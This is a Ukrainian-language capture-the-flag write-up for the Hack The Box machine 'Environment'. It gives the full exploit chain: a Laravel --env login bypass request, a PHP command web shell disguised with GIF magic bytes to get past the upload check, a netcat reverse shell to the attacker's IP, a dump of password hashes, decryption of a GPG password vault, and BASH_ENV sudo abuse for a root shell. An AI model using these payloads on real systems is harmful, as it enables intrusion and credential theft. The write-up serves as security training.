# HTB: Environment

## Про Environment

`Environment` — це машина Linux середньої складності. Початковий 
пункт передбачає використання 
[CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301), що
 дозволяє маніпулювати середовищем за допомогою параметра `--env`, обходячи
 функцію входу в систему. З панелі управління 
[CVE-2024-2154](https://nvd.nist.gov/vuln/detail/CVE-2024-2154) використовується 
для завантаження веб-оболонки `PHP`, вбудованої в зображення профілю, 
що дає гравцеві точку опори через виконання команд. На 
скомпрометованій системі можна знайти відкриті ключі `GPG` разом із 
зашифрованою резервною копією. Розшифровані дані містять дійсні паролі користувачів, 
що дає можливість доступу через `SSH`. Підвищення привілеїв досягається за допомогою 
дозволів sudo. Користувач може виконувати скрипт з підвищеними 
привілеями. Хоча сам скрипт є нешкідливим, змінна середовища `BASH_ENV` 
зберігається під час підвищення привілеїв, що 
дозволяє виконувати довільні команди як root. 

**Посилання на лабу:** https://app.hackthebox.com/machines/659

## Початкове сканування

Перше, що я люблю робити, це сканувати ціль за допомогою nmap для відкритих портів і дізнатись, які технології використовує машина:

```bash
nmap -Pn -p- --min-rate 2000 -sC -sV -vv -oA nmap/environment 10.129.135.179

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap сканування показує відкриті ssh і http порти. SSH має версію 9.2p1, а HTTP бекенд - nginx 1.22.1. Версія SSH вразлива до CVE-2024-6387 (regreSSHion), але я не думаю, що це шлях для експлуатації поки що, бо для експлуатації цієї вразливості потрібно буде чекати приблизно 6-8 годин, щоб отримати віддалений шелл. Думаю, я можу зробити це швидше ;)

Наш таргет має доменне ім'я environment.htb, яке потрібно додати до нашого /etc/hosts файлу для доступу до порту 80.

```bash
echo "10.129.135.179 environment.htb" | sudo tee -a /etc/hosts
```

## Вебсайт на 80 порту

Після доступу до http://environment.htb/ ми потрапляємо на простий веб-сайт:

![image](imgs/environment.png "environment.htb")

Після вивчення веб-сайту та його вихідного коду я помітив, що функціонал розсилки поштою має якусь робочу функціональність, що незвично для таких лаб. Також є CSRF токен в input тегу, який декодується в незрозумілий рядок за допомогою base64:

```html
<input type="hidden" name="_token" value="eQJKKZTGRTUtoOwXR1Sr9ysqHfNSDxt3qLLJBa6r" autocomplete="off">
```

```bash
echo "eQJKKZTGRTUtoOwXR1Sr9ysqHfNSDxt3qLLJBa6r" | base64 -d
yJ)E5-GT+*R
```

Але нічого особливого. Щоб не витрачати час, я спробую пошукати субдомени і приховані директорії на цілі, поки розглядаю функціональність розсилки поштою в BurpSuite.

Для фазингу субдоменів я використаю ffuf зі словником від seclists:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://FUZZ.environment.htb/"
```

Не знайшов жодних субдоменів. Давайте перевіримо приховані директорії:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://environment.htb/FUZZ"

build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 46ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
index.php               [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 432ms]
login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 520ms]
logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 477ms]
node_modules/.package-lock.json [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 46ms]
mailing                 [Status: 405, Size: 244871, Words: 46159, Lines: 2576, Duration: 5556ms]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 50ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 46ms]
up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 1204ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 46ms]
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 794ms]
```

Я знайшов кілька цікавих ендпоінтів, таких як login, upload, storage, mailing.

Використовуючи розширення Wappalyzer в браузері, я можу перевірити, що веб-сайт використовує PHP і Laravel.

Спроба доступу до `http://environment.htb/upload` або `http://environment.htb/mailing` показує нам версію PHP (8.2.28) і Laravel (11.30.0), а також повідомлення про помилку, яке вказує, що ми можемо надсилати лише POST запити до цих ендпоінтів:

![image](imgs/error-laravel.png)

Ця сторінка помилки також розкриває деякий внутрішній бекенд код, що означає, що додаток працює в **режимі дебагу**.

## Дослідження вразливостей і експлуатація

Після перевірки вразливостей для Laravel фреймворку я знайшов цю високо оцінену CVE: https://nvd.nist.gov/vuln/detail/CVE-2024-52301

Але поки що це здається марним, оскільки наш додаток уже в стані дебагу.

Також здається, що Laravel 11.30.0 вразливий до reflected XSS в режимі дебагу, [CVE-2024-13918](https://nvd.nist.gov/vuln/detail/CVE-2024-13918), але це не корисно для нашого випадку, оскільки у нас немає жертви для атаки.

Після гри з параметрами на login ендпоінті, я зміг розкрити деякий вихідний код бекенду, тому що додаток в режимі дебагу:

![image](imgs/login-debug.png)

Після видалення будь-якого значення з `remember` параметра в тілі запиту розкриває деяке додаткове середовище додатку, ймовірно призначене для використання розробниками:

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
    $request->session()->regenerate();
    $request->session()->put('user_id', 1);
    return redirect('/management/dashboard');
}
```

Тепер ми можемо підключити нашу [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301), щоб змінити середовище і зайти на ендпоінт (`/management/dashboard`), до якого ми не повинні мати доступу.

Згідно цьому [PoC](https://github.com/Nyamort/CVE-2024-52301), ми можемо надіслати такий запит до login ендпоінту для активації preprod середовища:

```http
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
Content-Length: 132
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://environment.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InRvSkEzL3hQcE1aMHBLUVVVQ0xWc3c9PSIsInZhbHVlIjoiaHlIY3ErT1V3aGxwcktVOWt5SXg4TFVJczVrNXJrV1prMGh5MW9JbC93L3hpTnJhem1CVnc5dEMybHJXOFhoYUx3TEl5VjlZYncwUHcweEtlMEdMME1uZHBqVEtWdGc0akIra2VpZXQrWGlmRW0xOStXcTVSZUx4WFBaQXhwTVciLCJtYWMiOiJiNzg0N2E1ODc4MWNlNmRlYzcwM2VmMTU2MWE4YzU0NjEzNTkzODgxOWNmNTUzMDQwOWYwNWViNzBlZWI2NDhlIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImowRjRqQmhQQUZXVHJuSEhuWDYvaWc9PSIsInZhbHVlIjoiakVvWG1qVFFyUlQyV3NITFhKOUliVDlhdW1jTGlHdHRrYUpYTW5XdG0wT3paa09GejQzM3ZyMHhURm1GU3d3Q1JKYmhaWXY5R1ZKTmdvRWVtQXRiTFNWTytnK2l3M3E2dUhBWE1kc3I3OWsraHVER3poMWFLYWFlSENvS0tKZWIiLCJtYWMiOiI2OTYzM2U1OGViMjBmODBmNzQzMGQ4MTdhNGY1OWQ0NGZmM2JiOGExMzM5MTUwZTgxZDgwYmYwODNlOWNmOGFjIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=REgoc9V6MU0xdUsJMbSBVygImoZg0AgDh0KY4X7A&email=admin%40environment.htb,attacker%40environment.htb&password=admin%27&remember=False
```

Після відправлення його в Burp потрібно натиснути на `Show response in browser`, щоб бути перенаправленим на `environment.htb/management/dashboard`

![image](imgs/burp-preprod.png)

![image](imgs/preprod.png)

В основному є один dev аккаунт, під яким ми входимо: hish@environment.htb

І єдина функціональність там - це завантажити зображення профілю, надіславши POST запит на `environment.htb/upload` ендпоінт.

## Обхід завантаження файлів

Спроба завантажити звичайний PHP шел не спрацює, тому що бекенд перевіряє 'magic bytes' всередині вмісту файлу, щоб перевірити, чи є файл справжнім зображенням чи ні. 

Тому нам потрібно знайти спосіб обійти ці перевірки і якось завантажити наш шелл.

## Завантаження php reverse shell

Я використаю цей сайт з різним набором віддалених шеллів під різні мови: https://www.revshells.com/
В даному випадку оскільки сайт працює на PHP, я вибрав собі такий:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Бекенд ймовірно має погану regex перевірку параметра filename, тому що я зміг завантажити файл з назвою `index.gif.php.` з PHP cmd шелом всередині і magic bytes в запиті для обходу перевірки типу MIME.

Для того, щоб обійти перевірку на magic bytes достатньо просто додати перед нашим шеллом рядок `GIF87a` для типу файлів gif, та, також, додати крапку в кінці назви файлу, яка обрізається на сервер-стороні й перетворюється на звичайний `index.gif.php`

```http
POST /upload HTTP/1.1
Host: environment.htb
Content-Length: 680
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyqgqevjtjeuKysRj
Accept: */*
Origin: http://environment.htb
Referer: http://environment.htb/management/profile
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InpRTit5azYwcm1kcnl3SUgxVUlqa2c9PSIsInZhbHVlIjoiTytCOG9rclVwNkdVdDVQQnVoVEVTelRJZVpKK1pHb2k2UzlvWEIrekw3YzhjNTRKNDFBYkU2Q0tRbnZhRkVncjQwN1NxWU4wV0FhL0E3RjM2dWdaTTFsT1EvT1lXcXplR3BmMTRGWDdXb3ZuMmhlS2U4bjFvOTNHMk51S01PLzQiLCJtYWMiOiI0MmM3MjczZjkxYjA5ZTRiNmM4ZWJjNDFiNWY2ODE2MzI4YWI5NzYzNmU0YjJiZDBkOTEyY2JhYmFlNDIxNDUyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImJZaWFGWFBKRk80ZGkycXVVRXhpK2c9PSIsInZhbHVlIjoidlp0SEpSdGFkeTJkYnRETzNGc0Q4MkgwTzFhSWpTYXNzWVdmU3lHK3A0WHEwQUpkZ1dkSzNPM2E2RmZoVkZZZnZNZnFqWjcxNmR3emxTSXF3N2E0YWJNVndxazhuY081NUpPeWpFcW1MMU5FSVp5WW9RVGFjcCtJK0wzOUYydmciLCJtYWMiOiIxMWVjZmM1NTM5NWI0ZGMzMDhlMTM2YTkwNjZhNTI4Y2FjMGEyOGVmZDFkNTBiYWQxNTAyZmViNTAwMDliODFiIiwidGFnIjoiIn0%3D
Connection: keep-alive

------WebKitFormBoundaryyqgqevjtjeuKysRj
Content-Disposition: form-data; name="_token"

U55EcHxTJCO0cvMScKzD20VSsKYd9oLV8lNhKtn9
------WebKitFormBoundaryyqgqevjtjeuKysRj
Content-Disposition: form-data; name="upload"; filename="index.gif.php."
Content-Type: image/jpeg

GIF87a
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

------WebKitFormBoundaryyqgqevjtjeuKysRj--
```

![image](imgs/shell-upload.png)

З зображення вище:
1. змінити filename на `index.gif.php.`
2. надіслати [PHP cmd пейлоад](https://www.revshells.com/) з magic bytes на початку файлу для обходу перевірки GIF MIME типу
3. бекенд парсить його як gif і показує, що мій PHP cmd шел знаходиться за адресою `http://environment.htb/storage/files/index.gif.php`

![image](imgs/rce.png)

Тепер у нас є RCE (Remote Code Execution) на цілі. Щоб отримати на нашій машині зворотний шел, потрібно:

## Reverse Shell

1. У нашому терміналі:
   ```bash
   rlwrap nc -lvnp 1337
   ```

2. На нашому завантаженому PHP cmd шелі надіслати будь-який шел під лінукс, що вказуватиме на наш ip:
   ```bash
   busybox nc 10.10.14.53 1337 -e sh
   ```

![image](imgs/revshell.png)

3. Я люблю отримувати постійний інтерактивний шел, який не втратить з'єднання через деякий час, тому я використаю цей набір команд для його отримання:
   ```bash
   # Після отримання віддаленого з'єднання на netcat на нашій машині:
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm-256color
   export TERM=xterm
   
   # Тепер натиснути Ctrl+Z
   
   stty raw -echo ; fg ; reset 
   stty columns 200 rows 200
   ```

## Ескалація привілеїв користувача

Коли ми отримуємо віддалений доступ до сервера, ми входимо в систему як користувач **www-data** в системі, який використовується в Linux системах веб-серверами типу Apache/Nginx для хостингу веб-додатків.

Щоб окреслити наші наступні кроки, ми подивимося на доступних користувачів на сервері:

```bash
www-data@environment:~/app/storage/app/public/files$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
hish:x:1000:1000:hish,,,:/home/hish:/bin/bash
```

Після перегляду `/etc/passwd` (файл, що містить всіх користувачів, що існують в unix системах) ми можемо здогадатися, що нам потрібно буде отримати доступ до користувача hish, а потім експлуатувати наш шлях до root:
`www-data -> hish -> root`

### Розвідка

Для початку нам потрібно перевірити будь-які критичні файли, які можуть містити інформацію про пароль hish (такі як логи, бази даних).

Під час пошуків я знайшов `database.sqlite` в `/var/www/app/database`:

![image](imgs/db.png)

![image](imgs/users-db.png)

```bash
www-data@environment:~/app/database$ sqlite3 database.sqlite
sqlite3 database.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
cache                  jobs                   sessions
cache_locks            mailing_list           users
failed_jobs            migrations
job_batches            password_reset_tokens
sqlite> select * from users;
select * from users;
1|Hish|hish@environment.htb||$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi||2025-01-07 01:51:54|2025-01-12 01:01:48|hish.png
2|Jono|jono@environment.htb||$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm||2025-01-07 01:52:35|2025-01-07 01:52:35|jono.png
3|Bethany|bethany@environment.htb||$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.||2025-01-07 01:53:18|2025-01-07 01:53:18|bethany.png
sqlite>
```

Ми бачимо хешований пароль нашого користувача hish, який можемо спробувати зламати за допомогою hashcat:

```bash
~/HackTheBox/environment > echo '$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi' > hish_hash.txt
~/HackTheBox/environment > hashid hish_hash.txt
--File 'hish_hash.txt'--
Analyzing '$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
--End of file 'hish_hash.txt'--%
~/HackTheBox/environment > hashcat hish_hash.txt -m 3200 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting
```

Але це не спрацює і займе багато часу і насправді не потрібно для отримання пароля hish, тому що у нас є доступ до домашньої директорії hish для читання всіх файлів всередині

### Розшифрування GPG Keyvault

```bash
www-data@environment:~$ ls -la /home/hish
ls -la /home/hish
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Sep  5 17:46 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Sep  5 04:00 user.txt
```

Дивлячись на директорію backup, ми бачимо файл `keyvault.gpg`, який можемо спробувати дешифрувати за допомогою GPG. Але ми не зможемо просто це зробити використовуючи `gpg -d keyvault.gpg`:

```bash
www-data@environment:/home/hish$ ls -la backup/
ls -la backup/
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Sep  5 17:48 keyvault.gpg
www-data@environment:/home/hish$ cd backup
cd backup
www-data@environment:/home/hish/backup$ gpg -d keyvault.gpg
gpg -d keyvault.gpg
gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied
```

тому що у нас немає дозволу створювати файли як користувач www-data в /var/www.

Тому нам потрібно скопіювати keyvault.gpg і .gnupg директорію hish з їхніми приватними ключами в директорію, де у нас є права на запис. Я використаю /tmp для цього:

```bash
www-data@environment:$ cd /tmp
www-data@environment:/tmp$ cp -r /home/hish/.gnupg . && cd .gnupg
www-data@environment:/tmp/.gnupg$ ls
openpgp-revocs.d   pubring.kbx   random_seed
private-keys-v1.d  pubring.kbx~  trustdb.gpg
www-data@environment:/tmp/.gnupg$ cp /home/hish/backup/keyvault.gpg .
www-data@environment:/tmp/.gnupg$ gpg --homedir /tmp/.gnupg -d keyvault.gpg
gpg --homedir /tmp/.gnupg -d keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

ось і паролі, ми можемо використати другий для входу як користувач hish:

![image](imgs/hish-pass.png)

```bash
www-data@environment:/home/hish/backup$ su hish
su hish
Password: marineSPm@ster!!

hish@environment:~/backup$
hish@environment:~/backup$ ls -la
ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Sep  5 17:56 keyvault.gpg
hish@environment:~/backup$
hish@environment:~/backup$ id
id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

Ми в системі! Перше, що я перевіряю, коли заходжу як звичайний користувач, це дивлюся, які програми я можу запускати з sudo за допомогою `sudo -l`:

![image](imgs/hish-sudo.png)

## Ескалація привілеїв root

Ця програма насправді простий bash скрипт:

```bash
hish@environment:~$ cat /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

Тут я втратив трохи часу, думаючи де або як ми можемо перехопити виконання цих команд, оскільки вони працюють як root. Але після перевірки `sudo -l` знову, я бачу, що пропустив важливе `env_keep+="ENV BASH_ENV"`. Це в основному означає, що ми можемо перезаписати внутрішню змінну середовища bash, тому коли ми викликаємо `/usr/bin/systeminfo`, ми можемо передати нашу власну змінну зі шляхом до зловмисного скрипту, який отримає root шел при спробі виконати bash бінарник.

### BASH_ENV

[Документація gnu](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV) визначає BASH_ENV як:

```
    Якщо ця змінна встановлена під час виклику Bash для виконання скрипта оболонки, її значення розширюється і використовується як ім'я файлу запуску, який слід прочитати перед виконанням скрипта. Див. Файли запуску Bash.
```

У розділі [Файли запуску Bash](https://www.gnu.org/software/bash/manual/bash.html#Bash-Startup-Files) сказано:
```
    Викликано в неінтерактивному режимі

    Коли Bash запускається в неінтерактивному режимі, наприклад, для виконання скрипта оболонки, він шукає змінну BASH_ENV в середовищі, розширює її значення, якщо воно там є, і використовує розширене значення як ім'я файлу для читання та виконання. Bash поводиться так, ніби було виконано наступну команду:

    if [ -n «$BASH_ENV» ]; then . «$BASH_ENV»; fi

    але значення змінної PATH не використовується для пошуку імені файлу.

    Як зазначено вище, якщо неінтерактивна оболонка викликається з опцією –login, Bash намагається прочитати та виконати команди з файлів запуску оболонки входу.
```

### Експлойт

Тепер, щоб отримати рут, нам потрібно створити наш власний shell скрипт, який скопіює bash бінарник з root привілеями, а потім вписати шлях до цього скрипта у змінній `BASH_ENV`:

```bash
hish@environment:~$ cat > /tmp/root.sh << 'EOF'
cp /bin/bash /tmp/root-bash
chmod +s /tmp/root-bash
EOF
hish@environment:~$ chmod +x /tmp/root.sh
hish@environment:~$ sudo BASH_ENV=/tmp/root.sh systeminfo && /tmp/root-bash -p

--- systeminfo output ---

root-bash-5.2# cd /root
root-bash-5.2# whoami
root
root-bash-5.2# cat root.txt
9eb852891e2a5a9bcca6604932c09ffa
root-bash-5.2#
```

Ми успішно отримали root шел в системі!
